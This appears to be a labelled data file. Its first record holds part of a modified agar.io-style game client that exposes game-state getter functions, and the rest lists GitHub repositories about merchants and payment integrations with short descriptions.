/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(d.navigator.userAgent),                 Ja = new Image;             Ja.src = ""img/split.png"";             var nb = document.createElement(""canvas"");             if (""undefined"" == typeof console || ""undefined"" ==                 typeof DataView || ""undefined"" == typeof WebSocket || null == nb || null == nb.getContext || null == d.localStorage) alert(""You browser does not support this game, we recommend you to use Firefox to play this"");             else {                 var ka = null;                 d.setNick = function(a) {                     //UPDATE                     firstStart = false;                     originalName = a;                     if (getPlayer().length == 0) {                         lifeTimer = new Date();                     }                      Xa();                     K = a;                     cb();                     R = 0                 };                 d.setRegion = ha;                 d.setSkins = function(a) {                     kb = a                 };                 d.setNames = function(a) {                     wa = a                 };                 d.setDarkTheme = function(a) {                     ta = a                 };                 d.setColors = function(a) {                     Oa = a                 };                 d.setShowMass = function(a) {                     lb = a                 };                 d.spectate = function() {                     K = null;                     H(1);                     Xa()                 };                 d.setGameMode = function(a) {                     a != P && ("":party"" ==                         P && e(""#helloContainer"").attr(""data-party-state"", ""0""), Y(a), "":party"" != a && I())                 };                 d.setAcid = function(a) {                     Ia = a                 };                 null != d.localStorage && (null == d.localStorage.AB9 && (d.localStorage.AB9 = 0 + ~~(100 * Math.random())), mb = +d.localStorage.AB9, d.ABGroup = mb);                 e.get(Na + ""//gc.agar.io"", function(a) {                     var b = a.split("" "");                     a = b[0];                     b = b[1] || """"; - 1 == [""UA""].indexOf(a) && ob.push(""ussr"");                     ea.hasOwnProperty(a) && (""string"" == typeof ea[a] ? y || ha(ea[a]) : ea[a].hasOwnProperty(b) && (y || ha(ea[a][b])))                 }, ""text"");                 d.ga && d.ga(""send"", ""event"", ""User-Agent"", d.navigator.userAgent, {                     nonInteraction: 1                 });                 var la = !1,                     Ya = 0;                 setTimeout(function() {                     la = !0                 }, Math.max(6E4 * Ya, 1E4));                 var ea = {                         AF: ""JP-Tokyo"",                         AX: ""EU-London"",                         AL: ""EU-London"",                         DZ: ""EU-London"",                         AS: ""SG-Singapore"",                         AD: ""EU-London"",                         AO: ""EU-London"",                         AI: ""US-Atlanta"",                         AG: ""US-Atlanta"",                         AR: ""BR-Brazil"",                         AM: ""JP-Tokyo"",                         AW: ""US-Atlanta"",                         AU: ""SG-Singapore"",                         AT: ""EU-London"",                         AZ: ""JP-Tokyo"",                         BS: ""US-Atlanta"",                         BH: ""JP-Tokyo"",                         BD: ""JP-Tokyo"",                         BB: ""US-Atlanta"",                         BY: ""EU-London"",                         BE: ""EU-London"",                         BZ: ""US-Atlanta"",                         BJ: ""EU-London"",                         BM: ""US-Atlanta"",                         BT: ""JP-Tokyo"",                         BO: ""BR-Brazil"",                         BQ: ""US-Atlanta"",                         BA: ""EU-London"",                         BW: ""EU-London"",                         BR: ""BR-Brazil"",                         IO: ""JP-Tokyo"",                         VG: ""US-Atlanta"",                         BN: ""JP-Tokyo"",                         BG: ""EU-London"",                         BF: ""EU-London"",                         BI: ""EU-London"",                         KH: ""JP-Tokyo"",                         CM: ""EU-London"",                         CA: ""US-Atlanta"",                         CV: ""EU-London"",                         KY: ""US-Atlanta"",                         CF: ""EU-London"",                         TD: ""EU-London"",                         CL: ""BR-Brazil"",                         CN: ""CN-China"",                         CX: ""JP-Tokyo"",                         CC: ""JP-Tokyo"",                         CO: ""BR-Brazil"",                         KM: ""EU-London"",                         CD: ""EU-London"",                         CG: ""EU-London"",                         CK: ""SG-Singapore"",                         CR: ""US-Atlanta"",                         CI: ""EU-London"",                         HR: ""EU-London"",                         CU: ""US-Atlanta"",                         CW: ""US-Atlanta"",                         CY: ""JP-Tokyo"",                         CZ: ""EU-London"",                         DK: ""EU-London"",                         DJ: ""EU-London"",                         DM: ""US-Atlanta"",                         DO: ""US-Atlanta"",                         EC: ""BR-Brazil"",                         EG: ""EU-London"",                         SV: ""US-Atlanta"",                         GQ: ""EU-London"",                         ER: ""EU-London"",                         EE: ""EU-London"",                         ET: ""EU-London"",                         FO: ""EU-London"",                         FK: ""BR-Brazil"",                         FJ: ""SG-Singapore"",                         FI: ""EU-London"",                         FR: ""EU-London"",                         GF: ""BR-Brazil"",                         PF: ""SG-Singapore"",                         GA: ""EU-London"",                         GM: ""EU-London"",                         GE: ""JP-Tokyo"",                         DE: ""EU-London"",                         GH: ""EU-London"",                         GI: ""EU-London"",                         GR: ""EU-London"",                         GL: ""US-Atlanta"",                         GD: ""US-Atlanta"",                         GP: ""US-Atlanta"",                         GU: ""SG-Singapore"",                         GT: ""US-Atlanta"",                         GG: ""EU-London"",                         GN: ""EU-London"",                         GW: ""EU-London"",                         GY: ""BR-Brazil"",                         HT: ""US-Atlanta"",                         VA: ""EU-London"",                         HN: ""US-Atlanta"",                         HK: ""JP-Tokyo"",                         HU: ""EU-London"",                         IS: ""EU-London"",                         IN: ""JP-Tokyo"",                         ID: ""JP-Tokyo"",                         IR: ""JP-Tokyo"",                         IQ: ""JP-Tokyo"",                         IE: ""EU-London"",                         IM: ""EU-London"",                         IL: ""JP-Tokyo"",                         IT: ""EU-London"",                         JM: ""US-Atlanta"",                         JP: ""JP-Tokyo"",                         JE: ""EU-London"",                         JO: ""JP-Tokyo"",                         KZ: ""JP-Tokyo"",                         KE: ""EU-London"",                         KI: ""SG-Singapore"",                         KP: ""JP-Tokyo"",                         KR: ""JP-Tokyo"",                         KW: ""JP-Tokyo"",                         KG: ""JP-Tokyo"",                         LA: ""JP-Tokyo"",                         LV: ""EU-London"",                         LB: ""JP-Tokyo"",                         LS: ""EU-London"",                         LR: ""EU-London"",                         LY: ""EU-London"",                         LI: ""EU-London"",                         LT: ""EU-London"",                         LU: ""EU-London"",                         MO: ""JP-Tokyo"",                         MK: ""EU-London"",                         MG: ""EU-London"",                         MW: ""EU-London"",                         MY: ""JP-Tokyo"",                         MV: ""JP-Tokyo"",                         ML: ""EU-London"",                         MT: ""EU-London"",                         MH: ""SG-Singapore"",                         MQ: ""US-Atlanta"",                         MR: ""EU-London"",                         MU: ""EU-London"",                         YT: ""EU-London"",                         MX: ""US-Atlanta"",                         FM: ""SG-Singapore"",                         MD: ""EU-London"",                         MC: ""EU-London"",                         MN: ""JP-Tokyo"",                         ME: ""EU-London"",                         MS: ""US-Atlanta"",                         MA: ""EU-London"",                         MZ: ""EU-London"",                         MM: ""JP-Tokyo"",                         NA: ""EU-London"",                         NR: ""SG-Singapore"",                         NP: ""JP-Tokyo"",                         NL: ""EU-London"",                         NC: ""SG-Singapore"",                         NZ: ""SG-Singapore"",                         NI: ""US-Atlanta"",                         NE: ""EU-London"",                         NG: ""EU-London"",                         NU: ""SG-Singapore"",                         NF: ""SG-Singapore"",                         MP: ""SG-Singapore"",                         NO: ""EU-London"",                         OM: ""JP-Tokyo"",                         PK: ""JP-Tokyo"",                         PW: ""SG-Singapore"",                         PS: ""JP-Tokyo"",                         PA: ""US-Atlanta"",                         PG: ""SG-Singapore"",                         PY: ""BR-Brazil"",                         PE: ""BR-Brazil"",                         PH: ""JP-Tokyo"",                         PN: ""SG-Singapore"",                         PL: ""EU-London"",                         PT: ""EU-London"",                         PR: ""US-Atlanta"",                         QA: ""JP-Tokyo"",                         RE: ""EU-London"",                         RO: ""EU-London"",                         RU: ""RU-Russia"",                         RW: ""EU-London"",                         BL: ""US-Atlanta"",                         SH: ""EU-London"",                         KN: ""US-Atlanta"",                         LC: ""US-Atlanta"",                         MF: ""US-Atlanta"",                         PM: ""US-Atlanta"",                         VC: ""US-Atlanta"",                         WS: ""SG-Singapore"",                         SM: ""EU-London"",                         ST: ""EU-London"",                         SA: ""EU-London"",                         SN: ""EU-London"",                         RS: ""EU-London"",                         SC: ""EU-London"",                         SL: ""EU-London"",                         SG: ""JP-Tokyo"",                         SX: ""US-Atlanta"",                         SK: ""EU-London"",                         SI: ""EU-London"",                         SB: ""SG-Singapore"",                         SO: ""EU-London"",                         ZA: ""EU-London"",                         SS: ""EU-London"",                         ES: ""EU-London"",                         LK: ""JP-Tokyo"",                         SD: ""EU-London"",                         SR: ""BR-Brazil"",                         SJ: ""EU-London"",                         SZ: ""EU-London"",                         SE: ""EU-London"",                         CH: ""EU-London"",                         SY: ""EU-London"",                         TW: ""JP-Tokyo"",                         TJ: ""JP-Tokyo"",                         TZ: ""EU-London"",                         TH: ""JP-Tokyo"",                         TL: ""JP-Tokyo"",                         TG: ""EU-London"",                         TK: ""SG-Singapore"",                         TO: ""SG-Singapore"",                         TT: ""US-Atlanta"",                         TN: ""EU-London"",                         TR: ""TK-Turkey"",                         TM: ""JP-Tokyo"",                         TC: ""US-Atlanta"",                         TV: ""SG-Singapore"",                         UG: ""EU-London"",                         UA: ""EU-London"",                         AE: ""EU-London"",                         GB: ""EU-London"",                         US: ""US-Atlanta"",                         UM: ""SG-Singapore"",                         VI: ""US-Atlanta"",                         UY: ""BR-Brazil"",                         UZ: ""JP-Tokyo"",                         VU: ""SG-Singapore"",                         VE: ""BR-Brazil"",                         VN: ""JP-Tokyo"",                         WF: ""SG-Singapore"",                         EH: ""EU-London"",                         YE: ""JP-Tokyo"",                         ZM: ""EU-London"",                         ZW: ""EU-London""                     },                     L = null;                 d.connect = Ca;                  //UPDATE                 /**                  * Tells you if the game is in Dark mode.                  * @return Boolean for dark mode.                  */                 window.getDarkBool = function() {                     return ta;                 }                  /**                  * Tells you if the mass is shown.                  * @return Boolean for player\'s mass.                  */                 window.getMassBool = function() {                     return lb;                 }                  /**                  * This is a copy of everything that is shown on screen.                  * Normally stuff will time out when off the screen, this                  * memorizes everything that leaves the screen for a little                  * while longer.                  * @return The memory object.                  */                 window.getMemoryCells = function() {                     return interNodes;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCellsArray = function() {                     return v;                 }                  /**                  * [getCellsArray description]                  * @return {[type]} [description]                  */                 window.getCells = function() {                     return E;                 }                  /**                  * Returns an array with all the player\'s cells.                  * @return Player\'s cells                  */                 window.getPlayer = function() {                     return k;                 }                  /**                  * The canvas\' width.                  * @return Integer Width                  */                 window.getWidth = function() {                     return m;                 }                  /**                  * The canvas\' height                  * @return Integer Height                  */                 window.getHeight = function() {                     return r;                 }                  /**                  * Scaling ratio of the canvas. The bigger this ration,                  * the further that you see.                  * @return Screen scaling ratio.                  */                 window.getRatio = function() {                     return h;                 }                  window.getZoomlessRatio = function() {                     return h2;                 }                  /**                  * [getOffsetX description]                  * @return {[type]} [description]                  */                 window.getOffsetX = function() {                     return aa;                 }                  window.getOffsetY = function() {                     return ba;                 }                  window.getX = function() {                     return s;                 }                  window.getY = function() {                     return t;                 }                  window.getPointX = function() {                     return ia;                 }                  window.getPointY = function() {                     return ja;                 }                  /**                  * The X location of the mouse.                  * @return Integer X                  */                 window.getMouseX = function() {                     return fa;                 }                  /**                  * The Y location of the mouse.                  * @return Integer Y                  */                 window.getMouseY = function() {                     return ga;                 }                  window.getMapStartX = function() {                     return pa;                 }                  window.getMapStartY = function() {                     return qa;                 }                  window.getMapEndX = function() {                     return ra;                 }                  window.getMapEndY = function() {                     return sa;                 }                  window.getScreenDistance = function() {                     var temp = screenDistance();                     return temp;                 }                  /**                  * A timestamp since the last time the server sent any data.                  * @return Last update timestamp                  */                 window.getLastUpdate = function() {                     return C;                 }                  window.getCurrentScore = function() {                   ",,1
0,https://github.com/tavisca-bootcamp/merchant-galaxy.git,Merchant guide to the galaxy problem,,0
0,https://github.com/halalah/HalalaH-Integration-Guides.git,Integration Guides For Merchants,,0
0,https://github.com/TravelbyBit/merchant_api.git,JSON object of merchants,,0
0,https://github.com/RazerMS/rms-mobile-xdk-www.git,Razer Merchant Services mobile payment core module,,0
0,https://github.com/RazerMS/rms-mobile-xdk-examples.git,Collection of Razer Merchant Services XDK examples,"xdk,examples,sdk,molpay,mobile,cimbworkaround,workaround,android,cimb,clicks,for,on,webview,example",0
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-OpenCart.git,SpectroCoin Bitcoin merchant plugin for OpenCart,,0
0,https://github.com/corekoans/tradehouse.git,A video streaming marketplace for merchants to sell their goods in a more immersive way ,,0
0,https://github.com/zap-me/zapm_app.git,Zap Merchant App,,0
0,https://github.com/RazerMS/WHMCS_Plugin.git,Razer Merchant Services WHMCS Shopping Cart Plugin,,0
0,https://github.com/mcash/merchant-api-python-sdk.git,Public python SDK for mCASH Merchant API,,0
0,https://github.com/bdiallo/lemon_way.git,Ruby client to query the LemonWay web merchant and blank label APIs,,0
0,https://github.com/PayGate/PayHost.git,Merchant integration helper in PHP,,0
0,https://github.com/Lambda-School-Labs/PT17_merchant-marketplace-b-be.git,merchant-marketplace project for Labspt17,labspt17,0
0,https://github.com/Xfers/xfers-merchant-guide.git,1 stop portal for merchant integration,,0
0,https://github.com/Mastercard/mastercard-merchant-identifier-php.git,https://packagist.org/packages/mastercard/merchant-identifier,,0
0,https://github.com/guisea/omnipay-flo2cash.git,An Omnipay driver for Flo2cash Merchant gateway using Payments WS,,0
0,https://github.com/Flubit/skucloud-seller-api-client-php.git,Flubit Merchant API PHP client library,web-services-team,0
0,https://github.com/Lambda-School-Labs/LABSPT15-merchant-marketplace-d-be.git,backend repo for labspt15 merchant-marketplace team d,,0
0,https://github.com/uspc-dev/merchant-access.git,Allow merchants to manage their stores and coupons.,,0
0,https://github.com/KaranVashist-Pluang/PluangMerchantPanel.git,Dashboard for pluang merchants to work with vouchers,,0
0,https://github.com/magebaycom/magento2-marketplace-hyperlocal-mobile-app.git,Magento 2 Marketplace Hyperlocal Mobile App will convert your store into a Hyperlocal Mobile App. Mobile apps have great features for buyers as well as merchants.,,0
0,https://github.com/lklcross/api.git,API for merchant,,0
0,https://github.com/Apptha/Magento-Paypal-Adaptive.git,Easy to split payments between the store owners and merchants through chained and paralleled payment systems for Magento Ecommerce sites with Apptha Paypal Adaptive,,0
0,https://github.com/RazerMS/rms-mobile-xdk-nativescript.git,Razer Merchant Services mobile payment for NativeScript (Typescript & Javascript),,0
0,https://github.com/rudracomputech/Magento-2-Nestpay-Payment-Gateway.git,You will transfer to merchant gateway url with all details,,0
0,https://github.com/dalenys/php-merchant-api.git,The dalenys PHP Merchant API,,0
0,https://github.com/PaymentHighway/paymenthighway-merchant-backend-demo.git,Payment Highway merchant backend demo,,0
0,https://github.com/CheckoutCrypto/checkoutcrypto-opencart.git,"{""CheckoutCrypto's OpenCart Merchant Client ""}",,0
0,https://github.com/feliperoveran/merchant-guide-to-the-galaxy.git,"{""Ruby solution to Merchant's Guide to the Galaxy problem""}",merchants-guide,0
0,https://github.com/vocalinkzapp/pbba-merchant-button-library-ios.git,PBBA Merchant Button Library - iOS,,0
0,https://github.com/wikimart/merchant-api-client-py.git,Merchant API client on Python,,0
0,https://github.com/merchantly/ansible.git,ansible playbooks to deploy merchantly,,0
0,https://github.com/HarshPatel13/elo-merchant.git,Analyzed customer credit transaction data in Python to predict loyalty score of individual merchants.,,0
0,https://github.com/paulocaldeira17/bank-cards-api.git,An API that allows you to create multiple cards and transactions using merchants authorization requests.,,0
0,https://github.com/Drzaln/BAKUL.git,Flutter application for tracking merchant around us.,,0
0,https://github.com/danieltlrlm/merchant-api-ruby.git,The Tophatter merchant platform is an e-commerce platform. It allows merchants to upload and manage inventory for sale on Tophatter.,,0
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-WordPress-WooCommerce.git,SpectroCoin Bitcoin merchant plugin for WordPress WooCommerce,,0
0,https://github.com/soda-framework/omnipay-merchant-warrior.git,Omnipay package for Merchant Warrior Direct API,,0
0,https://github.com/RazerMS/ECShop_Plugin.git,Razer Merchant Services ECShop Shopping Cart Plugin,,0
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-Drupal-Commerce.git,SpectroCoin Bitcoin merchant plugin for Drupal Commerce,,0
0,https://github.com/tuxite/pharmaship.git,A pharmacy software for merchant ships,,0
0,https://github.com/zotapay/php-sdk.git,PHP SDK for the Zotapay Merchant API,,0
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-Prestashop.git,SpectroCoin Bitcoin merchant plugin for Prestashop,,0
0,https://github.com/exhlim/Food-Flash-Sale.git,A web app that targets merchants to aid in reducing food wastage by conducting flash food sales. Contains a profit maximisation algorithm for merchants with Stripe API and Geolocation API for payment and proximity sorting respectively.,food-wastage,0
0,https://github.com/Cart2Cart/Ubercart-to-OpenCart-Migration-Module.git,Cart2Cart: Ubercart to OpenCart Migration Module allows merchants to connect the stores in order to make the data transfer possible. ,,0
0,https://github.com/vione0620/HBuilderBusiness.git,merchants,,0
0,https://github.com/luxin763323387/merchants.git,merchants,,0
0,https://github.com/asmallworldsite/pensio_api.git,A Ruby integration library for the AltaPay (formerly Pensio) eCommerce and Merchant APIs,,0
0,https://github.com/FrancisChenY/mimilu.git,Merchants app,,0
0,https://github.com/Ereddon/stellite-card-reader.git,Merchant application to bridge transaction between stellitepay and stellite-card-applet enabled javacard,,0
0,https://github.com/kevineaid/BPD.git,bpd merchants,,0
0,https://github.com/Midtrans/Merchant-Server-for-Midtrans-Mobile-SDK-Python-Sample.git,Merchant Server for Midtrans Mobile SDK Python Sample,,0
0,https://github.com/RazerMS/CSCart_Plugin.git,Razer Merchant Services CS Cart Shopping Cart Plugin,,0
0,https://github.com/braintree/paypal-commerce-platform-sample-merchant.git,A sample merchant server for a BraintreePayPalValidator integration.,,0
0,https://github.com/mkumar1810/mymerchant.git,merchants crm,,0
0,https://github.com/Everan-1994/merchants-admin.git,merchants admin,,0
0,https://github.com/StanislavGerm/Ruby-on-rails.git,Merchants app,,0
0,https://github.com/amigconsulting/merchants.git,merchants projetcs,,0
0,https://github.com/Vantiv/payfac-mp-sdk-php.git,"{""Worldpay's PHP SDK for PayFac Merchant Provisioning API""}",,0
0,https://github.com/Kappalucky/Kmerchants.git,Merchants Application,,0
0,https://github.com/liujianying/WeiLeMerchant.git,Merchants project,,0
0,https://github.com/saikrishnasaski/merchant-store.git,boarding merchants,,0
0,https://github.com/Jaccorot/MERCHANT-S-GUIDE-TO-THE-GALAXY.git,"{""MERCHANT'S GUIDE TO THE GALAXY wiht python""}",,0
0,https://github.com/evansmwendwa/directpay-online.git,PHP package to support directpay-online merchant transactions,,0
0,https://github.com/cityO/Uq-merchants.git,Uq-merchants,,0
0,https://github.com/alexk111/DeBitpay-Merchants.git,DeBitpay Merchants,,0
0,https://github.com/raycoding/MerchantGuideToGalaxy.git,Ruby Solution to Merchant Guide To Galaxy Coding Problem,,0
0,https://github.com/amigoge/test-merchants.git,test library for merchants,,0
0,https://github.com/MerkinMerchant/merkinmerchants.com.git,Merkin Merchants Webzone,,0
0,https://github.com/ultrasonic01/Solasta_upgrade_merchant.git,Add items to merchants ,,0
0,https://github.com/amigoge/test-merchants.git,test library for merchants,,0
0,https://github.com/Everan-1994/merchants-h5-api.git,merchants-h5-api,,0
0,https://github.com/MamunHoque/NMI-Gateway.git,Network Merchants Gateway API,,0
0,https://github.com/myarasi8/Pirates_Merchants.git,Pirates and Merchants Game,,0
0,https://github.com/jasharpe/merchants-of-the-stars.git,Merchants of the Stars,,0
0,https://github.com/chaitanyatejagolla/einvoice.git,Invoice for merchants,,0
0,https://github.com/projekequine/ProjectEquineDashboard.git,Web Dashboard for merchants,,0
0,https://github.com/StarTux/Merchant.git,Merchants with custom trades,,0
0,https://github.com/gispatial/tdmp-merchants.git,TDMP-MERCHANTS-FRONTEND-VUE,,0
0,https://github.com/sehresh/api.git,DuniaPay Merchants api service,,0
0,https://github.com/ChaselX/merchants.git,passbook of merchants,,0
0,https://github.com/windzzc/Pass_Sys.git,merchants and users,,0
0,https://github.com/vinialves/merchants.guide.galaxy.git,merchants guide galaxy,,0
0,https://github.com/Z-Saber/-.git,Merchants Mall applet repository,,0
0,https://github.com/ozshy/merch.git,How Merchants Get Paid,,0
0,https://github.com/sagar098/Galaxy_problem.git,Merchants galaxy problem,,0
0,https://github.com/sumitchirania/MarketPlace.git,Marketplace for merchants,,0
0,https://github.com/LykkeCity/Lykke.Service.PayMerchant.git,Lykke Pay merchants API,,0
0,https://github.com/kkna9877/MerchantNetwork.git,Simulation of merchants,"abm,finance,python3",0
0,https://github.com/tavisca-ssharma/MerchantsOfGalaxy.git,Merchants of Galaxy Assignment,,0
0,https://github.com/coinmerchantcap1/coinmerchantcap.git,decentralized merchants project,,0
0,https://github.com/kaosss888/merchants.git,passbook of merchants,,0
0,https://github.com/olegshatskov/merchant-tests.git,tests for merchants project,,0
0,https://github.com/aliqamer/GalaxyGuide.git,Merchants guide to galaxy,,0
0,https://github.com/ribwortplantain/ob.git,matches transactions to merchants,,0
0,https://github.com/4NobleTruths/MerchantsCryptoPledge.git,"{""Merchants' currency pledge.""}",,0
0,https://github.com/boxgrater/merchants.git,BoxGrater Merchants Component.,,0
0,https://github.com/ahmad2smile/user_management.git,Merchants Management System,,0
